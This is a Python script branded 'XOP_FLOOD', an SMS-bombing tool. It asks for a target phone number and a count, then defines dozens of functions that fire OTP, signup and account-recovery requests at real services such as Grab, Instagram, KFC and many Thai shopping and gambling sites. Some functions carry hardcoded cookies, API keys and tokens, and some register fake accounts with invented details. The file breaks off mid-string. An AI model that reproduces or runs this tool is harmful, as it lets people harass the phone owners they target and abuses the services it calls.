from importlib.metadata import requires
import re
import requests,json,time, sys
import threading, random, os, colorama, time, sys
from requests import Session
from threading import Thread
from re import search
from colorama import Fore, init
from colorama import Back as bg
from requests import get
import os
from typing_extensions import Required
import urllib.request
from typing import Any 
import discord
from discord import client
from discord.abc import Messageable
from requests import Session,post,get
from discord.utils import get
import gratient
from concurrent.futures import ThreadPoolExecutor 
from re import search
from time import sleep
import requests
from discord import channel
from discord import voice_client
from discord import guild
from discord import embeds
from datetime import datetime
from discord import message
from discord import member
from discord import activity
from discord.embeds import Embed
from discord.ext import commands
from discord.ext.commands.core import command, has_role
from discord.ext.commands.errors import RoleNotFound
from discord import  FFmpegPCMAudio
from youtube_dl import YoutubeDL
from requests import post, Session
from re import search
from random import choice
from string import ascii_uppercase, digits
from concurrent.futures import ThreadPoolExecutor
from discord.ext import commands

##########################################################################
header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"



init(convert=True)
banner = (gratient.purple("\n")) 
def head():
    print()


banner = ("\n")             

banner2 = ((" ║             ███████╗███╗   ███╗███████╗   ██        ██       ╔███████╗      ║ "))
banner3 = ((" ║            ██╔════╝████╗ ████║██╔════╝     ██      ██        ║██╔════╝      ║ "))
banner4 = ((" ║           ███████╗██╔████╔██║███████╗       ██    ██         ║███████╗      ║ "))
banner5 = ((" ║          ╚════██║██║╚██╔╝██║╚════██║         ██  ██          ║╚════██║      ║ "))
banner6 = ((" ║         ███████║██║ ╚═╝ ██║███████║           ████           ║███████║      ║ "))
banner7 = ((" ║       ╚══════╝╚═╝     ╚═╝╚══════╝              ██      ██    ╚══════╝ .5    ║ "))
banner12 = ((" ╔═════════════════════════════════════════════════════════════════════════════╗"))
banner13 = ((" ╚═════════════════════════════════════════════════════════════════════════════╝"))

time.sleep(.1)
print(gratient.purple(banner))
time.sleep(.1)
print(gratient.purple(banner12))
time.sleep(.1)
print(gratient.purple(banner2))
time.sleep(.1)
print(gratient.purple(banner3))
time.sleep(.1)
print(gratient.purple(banner4))
time.sleep(.1)
print(gratient.purple(banner5))
time.sleep(.1)
print(gratient.purple(banner6))
time.sleep(.1)
print(gratient.purple(banner7))
time.sleep(.1)
print(gratient.purple(banner13))







def randomString(N):
    return ''.join(choice(ascii_uppercase + digits) for _ in range(N))

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def newpage():
    head()




newpage()
print("")
##╔════════════════════════════════════════════╗
banner = ("\n")             
banner8 = (gratient.purple("       ║ [+] SPAMSMS 117 API                          ║")) 
banner9 = (gratient.purple("       ║ [!] FLOOD BY TIGER#9999                      ║"))
banner10 = (gratient.purple("       ║ [!] DISCORD : XOP HUB                        ║"))
banner11 = (gratient.purple("       ║ [!] LINK DISCORD | https://discord.io/XOPHUB ║"))
banner12 = (gratient.purple("       ╔══════════════════════════════════════════════╗"))
banner13 = (gratient.purple("       ╚══════════════════════════════════════════════╝"))
banner15 = (gratient.purple("       ║ [!] XOP_FLOOD V.5.5                          ║"))

print(banner12)
print(banner8)
print(banner9)
print(banner10)
print(banner11)
print(banner15)
print(banner13)

print(banner)
num = input (gratient.purple(" [+] PhoneNumber : > "))
n = int (input(gratient.purple(" [+] Amount : > ")))





session = requests.Session()
####----------------------------------------------------------------------------------------####

class SMS():

    def sk1(phone):
        post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62", "User-Agent": useragent},json={"phone": f"66{phone}"})


    def sk2(phone):
        post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": useragent}, json={"reqId":"39816-1633012470","params":{"phone": f"+66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})


    def sk3(phone):
        post("https://api2.1112.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})


    def sk4(phone):
        post("https://ecomapi.eveandboy.com/v10/user/signup/phone", headers={"User-Agent": useragent}, data={"phone": phone,"password":"123456789Az"})


    def sk5(phone):
        post("https://api.1112delivery.com/api/v1/otp/create", headers={"User-Agent": useragent}, data={'phonenumber': phone,'language': "th"})


    def sk6(phone):
        post("https://gccircularlivingshop.com/sms/sendOtp", headers={"User-Agent": useragent}, json={"grant_type":"otp","username": f"+66{phone[1:]}","password":"","client":"ecommerce"})


    def sk7(phone):
        post("https://shop.foodland.co.th/login/generation", headers={"User-Agent": useragent}, data={"phone": phone})


    def sk8(phone):
        post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code", headers={"User-Agent": useragent}, data={"number": f"+66{phone[1:]}"})


    def sk9(phone):
        post("https://api.sacasino9x.com/api/RegisterService/RequestOTP", headers={"User-Agent": useragent}, json={"Phone": phone})


    def sk10(phone):
        post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", headers={"User-Agent": useragent}, data={"phone": phone})


    def sk11(phone):
        post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", headers={"User-Agent": useragent}, data={"phone": phone})


    def sk12(phone):
        post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": useragent}, json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": f"66{phone[1:]}"})


    def sk13(phone):
        post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": useragent, "Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})


    def sk14(phone):
        session = Session()
        searchItem = session.get("https://www.shopat24.com/register/").text
        ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""", searchItem).group(1)
        session.post("https://www.shopat24.com/register/ajax/requestotp/", headers={"User-Agent": useragent, "content-type": "application/x-www-form-urlencoded; charset=UTF-8","X-CSRF-TOKEN": ReqTOKEN}, data={"phoneNumber": phone})

    def sk15(phone):
        post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", headers={"User-Agent": useragent}, data={"tel": phone,"otp_type":"register"})

    def sk16(phone):
        post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", headers={"User-Agent": useragent}, json={"on":{"value": phone,"country":"66"},"type":"mobile"})


    def sk17(phone):
        post(f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}", headers={"User-Agent": useragent})
 

    def sk18(phone):
        post("https://graph.firster.com/graphql",headers={"User-Agent": useragent, "organizationcode": "lifestyle","content-type": "application/json"}, json={"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone[1:],"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"})


    def sk19(phone):
        post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": useragent}, json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone": f"+66{phone[1:]}","type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName": randomString(10)}})


    def sk20(phone):
        post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": useragent}, json={"phone_number":f"+66{phone[1:]}"})


    def sk21(phone):
        post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": useragent} ,json={"brands_id":"609caede5a67e5001164b89d","agent_register":"60a22f7d233d2900110070d7","tel": phone})


    def sk22(phone):
        session = Session()
        ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated", headers={"User-Agent": useragent}).text
        session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",headers={"User-Agent": useragent,"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''})


    def sk23(phone):
        post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP", data={"mobileNumber":f"0{phone}"})

    def sk24(phone):
        post(url="https://www.tgfone.com/index.php/signin/otp_chk", data={"mobile":f"0{phone}"})

    def sk25(phone):
        post("https://api2.1112.com/api/v1/otp/create", json={"phonenumber":f"0{phone}","language":"th"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

    def sk26(phone):
        post("https://unacademy.com/api/v3/user/user_check/", json={"phone":f"0{phone}","country_code":"TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

    def sk27(phone):
        post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}")

    def sk28(phone):
        post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register", json={"username": f"0{phone}","password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

    def sk29(phone):
        post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

    def sk30(phone):
        post("https://www.berlnw.com/reservelogin", data={"p_myreserve": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

    def sk31(phone):
        post("https://www.kickoff28.com/action.php?mode=PreRegister", data={"tel": f"0{phone}"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

    def sk32(phone):
        post("https://1ufabet.com/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"0{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"})

    def p1112(phone):
        d=post('https://api2.1112.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers= header).status_code

    def p1112v2(phone):
        d=post('https://api.1112delivery.com/api/v1/otp/create',json={"phonenumber":phone,"language":"th"},headers=header).status_code

    def yandex(phone):
        d=post("https://taxi.yandex.kz/3.0/launch/",json={},headers=header).json()
        d=post("https://taxi.yandex.kz/3.0/auth/",json={"id": d["id"], "phone": f"+66{phone[1:]}"},headers=header).text

    def okru(phone):
        s=Session()
        s.headers.update({"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38","Content-Type" : "application/x-www-form-urlencoded","Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"})
        s.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data=f"st.r.phone=+66{phone[1:]}")
        s.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data="st.r.fieldAcceptCallUIButton=Call")

    def karusel(phone):
        s=Session()
        s.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})

    def KFC(_phone):
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})

    def icq(phone):
        post(f"https://u.icq.net/api/v4/rapi",json={"method":"auth/sendCode","reqId":"24973-1587490090","params":{"phone": f"66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},headers=header)

    def findclone(phone):
        d=get(f"https://findclone.ru/register?phone=+66{phone[1:]}",headers={"X-Requested-With" : "XMLHttpRequest","User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"}).json()

    def AISPlay(PHONE):
        session = Session() #AISPlay
        print("AisPlay", 
                data=f"msisdn=66{PHONE[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36",
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "authorization": f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", session.get(
                    "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
                headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX2 Build/HUAWEIDUB-LX2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36"}).text).group(1)}'''})

    def spam_pizza(phone): #pizza
        requests.post('https://api2.1112.com/api/v1/otp/create', data = {'phonenumber': phone, 'language': "th"})

    def youla(phone):
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})

    def Rapid(phone):
        d=post('https://rapidapi.com/blaazetech/api/spam-caller-check/',json={"phonenumber":phone,"language":"th"},headers=header).status_code

    def api1(phone):
	    requests.post("https://m.thisshop.com/cos/send/code/notice", json={"sessionContext":{"channel":"h5","entityCode":0,"userReferenceNumber":"12w12y11r52gz259ue14rr7g7370239m","localDateTimeText":"20220115182850","riskMessage":"{}","serviceCode":"FLEX0001","superUserId":"sysadmin","tokenKey":"149d5c7bae10304c8aba0da2bbc59cb7","authorizationReason":"","transactionBranch":"TFT_ORG_0000","userId":"","locale":"th-TH"},"noticeType":1,"businessType":"RT0001","phoneNumber":f"66-{phone}"},headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})

class SMS2():	
    def api2(phone):
        headers = {
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
            "cookie": "_gcl_au=1.1.1123274548.1637746846"
            }
        requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")
        
    def api3(phone):
        requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number":phone})
        
    def api4(phone):
        requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
        
    def api5(phone):
        requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
        
    def api6(phone):
        requests.post("http://b226.com/x/code", data={f"phone":phone})

    def api7(phone):
        requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")
        
    def api8(phone):
        requests.post("https://api.mcshop.com/cognito/me/forget-password",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"username": phone})
        
    def api9(phone):
        requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
        
    def api10(phone):
        requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})
        
    def api11(phone):
        requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text
        
    def api12(phone):
        requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone":"66"+phone})
        
    def api13(phone):
        requests.post("https://samartbet.com/api/request/otp", data={"phoneNumber":phone,"token":"HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"})
        
    def api14(phone):
        requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})
        
    def api15(phone):
        requests.post("http://b226.com/x/code", data={f"phone":phone})
        
    def api16(phone):
        requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})
        
    def api17(phone):
        requests.post("https://www.berlnw.com/reservelogin",data={"p_myreserve": phone}, headers={"Host": "www.berlnw.com", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "Save-Data": "on", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "https://www.berlnw.com/myaccount", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "th-TH,th;q=0.9,en;q=0.8", "Cookie": "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"})
        
    def api18(phone):
        requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
        
    def api19(phone):
        requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}")
        
    def api20(phone):
        requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})
        
    def api21(phone):
        requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})
        
    def api22(phone):
        requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()

    def api23(phone):
        requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": phone})
        
    def api24(phone):
        requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
        
    def api25(phone):
        requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
        
    def api26(phone):
        requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json
        
    def api27(phone):
        requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone)
        
    def api28(phone):
        requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})
        
    def api29(phone):
        requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": phone},headers={})
        
    def api30(phone):
        requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": phone})
        
    def api31(phone):
        requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": phone,"password":"123456789Az"})
        
    def api32(phone):
        requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
        requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
        
    def api33(phone):
        head = {
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "referer": "https://laopun.com/register",
            "cookie": "PHPSESSID=q32n008kgetm0tilch7f5qv2qp;_ga=GA1.1.677079826.1639848607;_ga_70EKP2Z28V=GS1.1.1639848607.1.1.1639848745.0"
            }
        requests.get(f"https://laopun.com/send-sms?id={phone}&otp=5153",headers=head)
        
    def api34(phone):
        requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})
        
    def api35(phone):
        head = {
            "content-type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
            "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_